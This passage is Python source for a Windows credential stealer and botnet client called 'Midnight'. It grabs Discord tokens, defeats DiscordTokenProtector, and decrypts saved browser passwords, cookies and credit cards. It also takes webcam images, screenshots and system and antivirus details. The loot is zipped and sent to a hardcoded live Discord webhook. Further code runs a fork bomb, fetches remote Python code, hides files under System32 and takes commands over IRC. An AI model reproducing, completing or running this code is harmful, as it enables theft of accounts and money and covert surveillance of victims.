        grabbed_files_folder = os.path.join(temp_folder, 'Grabbed Files')
        os.makedirs(grabbed_files_folder, exist_ok=True)

        num_cameras = 0
        cameras = []

        while True:
            cap = cv2.VideoCapture(num_cameras)
            if not cap.isOpened():
                break
            cameras.append(cap)
            num_cameras += 1

        if num_cameras == 0:
            print("No webcams found.")
            return

        for _ in range(num_images):
            for i, cap in enumerate(cameras):
                ret, frame = cap.read()
                if ret:
                    filename = os.path.join(grabbed_files_folder, f"image_from_camera_{i}.jpg")
                    cv2.imwrite(filename, frame)

        for cap in cameras:
            cap.release()

    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def save_to_file(self):
        save_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight', 'Grabbed Messenger', 'Discord')
        os.makedirs(save_folder, exist_ok=True)

        discord_file = os.path.join(save_folder, "discord.txt")
        with open(discord_file, 'w') as f:
            for token in self.tokens:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                    'Content-Type': 'application/json',
                    'Authorization': token
                }
                user = requests.get(self.baseurl, headers=headers).json()
                user_info = {
                    "Username": user['username'],
                    "Discriminator": user['discriminator'],
                    "User ID": user['id'],
                    "Email": user.get('email', 'N/A'),
                    "Phone": user.get('phone', 'N/A'),
                    "MFA Enabled": user.get('mfa_enabled', 'N/A')
                }
                f.write("==================================================\n")
                f.write(f"Token: {token}\n")
                f.write(json.dumps(user_info, indent=4))
                f.write("\n" + "="*50 + "\n")

    def system_information(self):
        temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
        system_info_path = os.path.join(temp_folder, 'Grabbed Files', 'System Information')
        os.makedirs(system_info_path, exist_ok=True)

        def write_to_file(filename, content):
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(content)
            except Exception as e:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"Error: {str(e)}\n")

        os_info_content = (
            f"OS: {platform.system()} {platform.version()}\n"
            f"OS Release: {platform.release()}\n"
            f"OS Architecture: {platform.architecture()[0]}\n"
            f"Machine: {platform.machine()}\n"
            f"Processor: {platform.processor()}\n"
        )
        write_to_file(os.path.join(system_info_path, "os_info.txt"), os_info_content)

        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            hostname_ip_content = (
                f"Hostname: {hostname}\n"
                f"IP Address: {ip_address}\n"
            )
            write_to_file(os.path.join(system_info_path, "hostname_ip.txt"), hostname_ip_content)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "hostname_ip.txt"), f"Error: {str(e)}\n")

        try:
            cpu_info = psutil.cpu_times_percent(interval=1, percpu=False)
            cpu_info_content = (
                f"CPU Usage: {cpu_info.user}% user, {cpu_info.system}% system, {cpu_info.idle}% idle\n"
                f"CPU Cores: {psutil.cpu_count(logical=False)} physical, {psutil.cpu_count(logical=True)} logical\n"
                f"CPU Frequency: {psutil.cpu_freq().current} MHz\n"
            )
            write_to_file(os.path.join(system_info_path, "cpu_info.txt"), cpu_info_content)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "cpu_info.txt"), f"Error: {str(e)}\n")

        try:
            ram = psutil.virtual_memory()
            ram_info_content = (
                f"Total RAM: {ram.total / (1024 ** 3):.2f} GB\n"
                f"Used RAM: {ram.used / (1024 ** 3):.2f} GB\n"
                f"Available RAM: {ram.available / (1024 ** 3):.2f} GB\n"
                f"RAM Usage: {ram.percent}%\n"
            )
            write_to_file(os.path.join(system_info_path, "ram_info.txt"), ram_info_content)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "ram_info.txt"), f"Error: {str(e)}\n")

        try:
            disk = psutil.disk_usage('/')
            disk_info_content = (
                f"Total Disk Space: {disk.total / (1024 ** 3):.2f} GB\n"
                f"Used Disk Space: {disk.used / (1024 ** 3):.2f} GB\n"
                f"Free Disk Space: {disk.free / (1024 ** 3):.2f} GB\n"
                f"Disk Usage: {disk.percent}%\n"
            )
            write_to_file(os.path.join(system_info_path, "disk_info.txt"), disk_info_content)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "disk_info.txt"), f"Error: {str(e)}\n")

        try:
            mac_addresses = subprocess.check_output("getmac", shell=True).decode("utf-8")
            write_to_file(os.path.join(system_info_path, "macaddresses.txt"), mac_addresses)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "macaddresses.txt"), f"Error: {str(e)}\n")

        try:
            system_info = subprocess.check_output("systeminfo", shell=True).decode("utf-8")
            write_to_file(os.path.join(system_info_path, "System Information.txt"), system_info)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "System Information.txt"), f"Error: {str(e)}\n")

        try:
            installed_programs = subprocess.check_output("wmic product get name", shell=True).decode("utf-8")
            write_to_file(os.path.join(system_info_path, "installed_programs.txt"), installed_programs)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "installed_programs.txt"), f"Error: {str(e)}\n")

        try:
            antivirus_info = subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True).decode('utf-8')
            write_to_file(os.path.join(system_info_path, "antivirus.txt"), antivirus_info)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "antivirus.txt"), f"Error: {str(e)}\n")

        try:
            services_info = subprocess.check_output('sc query', shell=True).decode('utf-8')
            write_to_file(os.path.join(system_info_path, "running_services.txt"), services_info)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "running_services.txt"), f"Error: {str(e)}\n")

        try:
            process_list = subprocess.check_output('tasklist', shell=True).decode('utf-8')
            write_to_file(os.path.join(system_info_path, "process_list.txt"), process_list)
        except Exception as e:
            write_to_file(os.path.join(system_info_path, "process_list.txt"), f"Error: {str(e)}\n")

    def collect_pictures(self):
        pictures_folder = os.path.join(os.path.expanduser('~'), 'Pictures')
        destination_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Grabbed Files', 'Pictures Folder')

        valid_extensions = ['.png', '.jpeg', '.jpg', '.gif']

        for root, dirs, files in os.walk(pictures_folder):
            for file in files:
                if any(file.lower().endswith(ext) for ext in valid_extensions):
                    file_path = os.path.join(root, file)
                    destination_path = os.path.join(destination_folder, file)
                    
                    try:
                        shutil.copy(file_path, destination_path)
                    except Exception as e:
                        print(f"Error copying {file}: {e}")

    def capture_screenshot(self):
        temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
        screenshot_folder = os.path.join(temp_folder, 'Grabbed Files')
        os.makedirs(screenshot_folder, exist_ok=True)
        screenshot_path = os.path.join(screenshot_folder, "screenshot.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

    def get_master_key(self, path: str) -> Union[bytes, None]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            return CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> Union[str, None]:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception:
            return None

    def passwords(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(self.browser_credentials_folder, f'{name}_passwords.txt')
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            password = self.decrypt_password(results[2], self.masterkey)
            if password:
                with open(password_file_path, "a", encoding="utf-8") as f:
                    if os.path.getsize(password_file_path) == 0:
                        f.write("Website  |  Username  |  Password\n\n")
                    f.write(f"{results[0]}  |  {results[1]}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path = os.path.join(path, 'Network', 'Cookies')
        else:
            path = os.path.join(path, profile, 'Network', 'Cookies')
        if not os.path.isfile(path):
            return
        temp_cookie_file = os.path.join(self.browser_credentials_folder, f'{name}_cookies_temp')
        shutil.copy2(path, temp_cookie_file)
        conn = sqlite3.connect(temp_cookie_file)
        cursor = conn.cursor()
        cookie_file_path = os.path.join(self.browser_credentials_folder, f'{name}_cookies.txt')
        with open(cookie_file_path, 'a', encoding='utf-8') as f:
            rows = cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies").fetchall()
            for host_key, name, path, encrypted_value in rows:
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value:
                    f.write(f"{host_key}\t{path}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(temp_cookie_file)

    def history(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(self.browser_credentials_folder, f'{name}_history.txt')
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                f.write(f"{res[0]}  |  {res[1]}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(self.browser_credentials_folder, f'{name}_cc.txt')
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                card_number = self.decrypt_password(res[3], self.masterkey)
                if card_number:
                    f.write(f"{res[0]}  |  {res[1]}  |  {res[2]}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def create_file_tree(self, main_folder: str):
        output_file = os.path.join(main_folder, 'file_tree.txt')
        user_home = os.path.expanduser('~')
        folders_to_include = ['Downloads', 'Pictures', 'Videos', 'Desktop']
        
        with open(output_file, 'w', encoding='utf-8') as f:
            for folder in folders_to_include:
                folder_path = os.path.join(user_home, folder)
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        level = root.replace(folder_path, '').count(os.sep)
                        indent = '│   ' * (level)
                        f.write(f"{indent}{os.path.basename(root)}/\n")
                        subindent = '│   ' * (level + 1)
                        for i, file in enumerate(files):
                            if i == len(files) - 1:
                                f.write(f"{subindent}└── {file}\n")
                            else:
                                f.write(f"{subindent}├── {file}\n")

    def zip_folder(self, folder_path: str) -> str:
        zip_file = os.path.join(create_rootkit_folder(), f"{get_user()}_Files.zip")
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder_name, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(folder_name, filename)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname=arcname)
        return zip_file

    def send_webhook(self, url: str):
        try:
            main_folder = os.path.dirname(self.browser_credentials_folder)
            self.capture_screenshot()
            self.system_information()
            self.killprotector()  # discord
            self.grabTokens()  # discord
            self.save_to_file()  # discord
            self.create_file_tree(main_folder)
            self.capture_webcam_images(num_images=1)
            archive_path = self.zip_folder(main_folder)
            with open(archive_path, 'rb') as f:
                response = requests.post(
                    url,
                    files={'file': f},
                    data={
                        'content': f'Zombie Notification $ {get_user()}',
                        'username': 'Midnight | https://guns.lol/247msn',
                        'embeds': [
                            {
                                'title': '**@everyone new zombie online**',
                                'description': '**Midnight grabber made by 247msn for Midnight Botnet.**',
                                'color': 14177041
                            }
                        ]
                    }
                )
                print(response.status_code)
        except Exception as e:
            print(f"Error: {e}")

def kill_cpu():
    os.system('%0|%0')
    os.system('taskkill /IM explorer.exe /F')
    # remove 


# -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

def delete_temp_folder():
    temp_folder = os.path.join(os.environ['SystemRoot'], 'System32', '$77', 'Midnight')
    shutil.rmtree(temp_folder, ignore_errors=True)

def delete_compiled_archive():
    directory = os.path.join(os.environ['SystemRoot'], 'System32', '$77')
    for filename in os.listdir(directory):
        if filename.endswith(('.rar', '.zip')):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):
                os.remove(file_path)

async def run_all_shit():
    delete_temp_folder()
    delete_compiled_archive()
    start_time = time.time()
    await DiscordInjection().InjectIntoToDiscord(webhook)
    stealer = InformationGrabber()
    stealer.send_webhook("https://discord.com/api/webhooks/1302459865712824322/VtPJlJZOPqTQdt4u0VJxILSSIJTGNr78226BVdZhN5IK8s3EBXucZ_x1VfXwFABRwBAX")
    delete_temp_folder()
    delete_compiled_archive()

# remember to add code for get ti, so if 32 bit computer it will get the 32 bit version of runasti.exe its in same github repo

def fetch_python_code(installer_url):
    try:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        headers = {'User-Agent': user_agent}
        req = urllib.request.Request(installer_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching code from {installer_url}: {e}")
        return None

def write_python_file(installer_url):
    try:
        code = fetch_python_code(installer_url)
        if code:
            temp_dir = os.getenv('TEMP')
            py_file_path = os.path.join(temp_dir, "installer.py")
            with open(py_file_path, 'w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        else:
            print("Error: No code to write for installer.")
            return None
    except Exception as e:
        print(f"Error writing installer file: {e}")
        return None

def connect_to_internet_relay_chat():
    server = f"{get_irc_server()}"
    port = 6697
    channel = f"{get_irc_channel()}"
    channel_password = f"{get_irc_password()}"

    irc = connect_to_irc(server, port, channel, channel_password)
    if irc:
        handle_messages(irc, channel)
    print("Error connecting re-directing.")
    error_connecting_to_irc()

def error_connecting_to_irc():
    os.system('cls')
    print("Temporary ~ error connecting to irc")
    while True:
        time.sleep(1)
        connect_to_internet_relay_chat()
        print("Temporary ~ error connecting to irc")

def create_mutex(mutex_value):
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexA(None, False, mutex_value.encode('utf-8'))
    return kernel32.GetLastError() != 183

if __name__ == '__main__':
    mutex_value = "0df98shuj87u8hu382jr892as543dfg"
    if create_mutex(mutex_value):
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Mutex created successfully.")
        connect_to_internet_relay_chat()
    else:
        print("Mutex already exists.")
        sys.exit()